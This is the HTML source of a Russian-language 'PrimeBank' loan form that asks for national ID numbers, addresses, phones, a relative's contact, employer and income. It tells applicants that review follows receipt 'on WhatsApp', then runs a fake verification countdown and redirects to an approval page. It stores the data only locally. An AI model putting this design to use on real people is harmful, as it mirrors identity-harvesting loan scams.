<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PrimeBank — Заявка на кредит без залога</title>
    <link rel="icon" type="image/png" sizes="32x32" href="logopng.png">
    <link rel="icon" type="image/png" sizes="16x16" href="logopng.png">
    <link rel="apple-touch-icon" href="logopng.png">

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

<style>
    * { box-sizing: border-box; font-family: Roboto, "Open Sans", sans-serif; }
    body {
        margin: 0;
        min-height: 100vh;
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        display: flex;
        justify-content: center;
        align-items: flex-start;
        padding: 40px 20px;
        position: relative;
    }
    body::before {
        content: "PrimeBank";
        position: absolute;
        top: 50%; left: 50%;
        transform: translate(-50%, -50%);
        font-size: 120px; font-weight: 900;
        color: rgba(255,255,255,0.05);
        white-space: nowrap;
        z-index: 0; user-select: none; pointer-events: none;
        animation: pulse 6s ease-in-out infinite;
    }
    @keyframes pulse {
        0%,100% { transform: translate(-50%, -50%) scale(1); }
        50% { transform: translate(-50%, -50%) scale(1.02); }
    }
    .form-container {
        background: #fff;
        border-radius: 16px;
        padding: 32px;
        width: 100%;
        max-width: 600px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        position: relative;
        z-index: 1;
        animation: fadeIn 0.6s ease;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    h1 { text-align: center; font-size: 24px; margin-bottom: 24px; color: #203a43; }
    p { font-size: 14px; margin-bottom: 20px; color: #555; line-height: 1.5; }
    .field { margin-bottom: 16px; }
    .field label { display: block; margin-bottom: 6px; font-size: 14px; color: #555; }
    .field input, .field textarea {
        width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid #ccc; font-size: 15px; outline: none; transition: 0.2s;
    }
    .field input:focus, .field textarea:focus { border-color: #203a43; }
    .submit-btn {
        width: 100%; padding: 14px; border-radius: 12px; border: none; background: #203a43;
        color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.3s;
    }
    .submit-btn:hover { background: #162b33; transform: translateY(-2px); }
    .note { font-size: 13px; color: #999; margin-top: 10px; }

    /* Модальное окно */
    .modal-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center;
        opacity: 0; visibility: hidden; transition: 0.3s;
        z-index: 10;
    }
    .modal-overlay.active { opacity: 1; visibility: visible; }
    .modal {
        background: #fff; border-radius: 16px; padding: 32px; width: 90%; max-width: 400px; text-align: center;
        box-shadow: 0 20px 40px rgba(0,0,0,0.25);
        animation: fadeIn 0.4s ease;
    }
    .modal h2 { margin-bottom: 16px; font-size: 20px; color: #203a43; }
    .modal p { font-size: 14px; color: #555; margin-bottom: 20px; }
    .modal .timer { font-size: 18px; font-weight: 600; color: #203a43; }

    @media (max-width: 480px) {
      .form-container { padding: 24px 16px; }
    h1 { font-size: 20px; }
       .submit-btn { font-size: 15px; padding: 12px; }
    }
</style>
</head>
<body>
    <div class="form-container">
        <h1>Заявка на кредит без залога</h1>
        <p>Для рассмотрения заявки отправляйте все необходимые данные. Заявка будет рассмотрена в течение 20 минут после поступления информации на WhatsApp.</p>

        <form id="loanForm">
            <div class="field"><label>ИИН</label><input type="text" id="iin" placeholder="12 цифр" required></div>
            <div class="field"><label>Номер удостоверения личности</label><input type="text" id="idNumber" placeholder="Номер удостоверения" required></div>
            <div class="field"><label>Адрес прописки</label><input type="text" id="registeredAddress" placeholder="Адрес прописки" required></div>
            <div class="field"><label>Фактический адрес проживания (если отличается)</label><input type="text" id="actualAddress" placeholder="Фактический адрес"></div>
            <div class="field"><label>Сотовый номер</label><input type="text" id="mobilePhone" placeholder="+7XXXXXXXXXX" required></div>
            <div class="field"><label>Домашний номер (если нет — сотовый родственника и ФИО)</label><input type="text" id="homePhone" placeholder="Домашний телефон или родственника" required></div>
            <div class="field"><label>Сумма займа</label><input type="number" id="loanAmount" placeholder="Сумма" required></div>
            <div class="field"><label>Срок займа (в месяцах)</label><input type="number" id="loanTerm" placeholder="Срок" required></div>
            <div class="field"><label>Место работы</label><input type="text" id="workPlace" placeholder="Где работаете" required></div>
            <div class="field"><label>Номер рабочего телефона</label><input type="text" id="workPhone" placeholder="+7XXXXXXXXXX" required></div>
            <div class="field"><label>Ежемесячный доход</label><input type="number" id="income" placeholder="Сумма дохода" required></div>
            <button class="submit-btn">Отправить заявку</button>
            <div class="note">Все поля обязательны, если не указано иначе.</div>
        </form>
        </div>

        <!-- Модальное окно -->
        <div class="modal-overlay" id="modal">
        <div class="modal">
            <h2>Ваша заявка отправлена</h2>
            <p>Система проверяет данные, пожалуйста подождите.</p>
            <div class="timer" id="timer">2:00</div>
        </div>
    </div>

<script>
const form = document.getElementById("loanForm");
const modal = document.getElementById("modal");

const phoneFields = ["mobilePhone","workPhone"];
phoneFields.forEach(id => {
    const input = document.getElementById(id);
    input.addEventListener("input", () => {
        if (!input.value.startsWith("+7")) input.value = "+7";
        input.value = "+7" + input.value.replace(/\D/g,"").slice(1,11);
    });
});

form.onsubmit = (e) => {
    e.preventDefault();

    // Сохраняем данные в localStorage для демо
    const data = {
        iin: document.getElementById("iin").value,
        idNumber: document.getElementById("idNumber").value,
        registeredAddress: document.getElementById("registeredAddress").value,
        actualAddress: document.getElementById("actualAddress").value,
        mobilePhone: document.getElementById("mobilePhone").value,
        homePhone: document.getElementById("homePhone").value,
        loanAmount: document.getElementById("loanAmount").value,
        loanTerm: document.getElementById("loanTerm").value,
        workPlace: document.getElementById("workPlace").value,
        workPhone: document.getElementById("workPhone").value,
        income: document.getElementById("income").value
    };
    localStorage.setItem("loanNoCollateralForm", JSON.stringify(data));

    // Показываем модальное окно
    modal.classList.add("active");

    // Таймер обратного отсчёта 4:00
    let time = 1 * 60; // 4 минуты в секундах
    const timerEl = document.getElementById("timer");

    const interval = setInterval(() => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        timerEl.textContent = `${minutes}:${seconds.toString().padStart(2,'0')}`;
        time--;
        if(time < 0) {
            clearInterval(interval);
            // Автоматический редирект после окончания таймера
            window.location.href = "loan-approved.html";
        }
    }, 1000);

    form.reset();
};
</script>


</body>

</html>
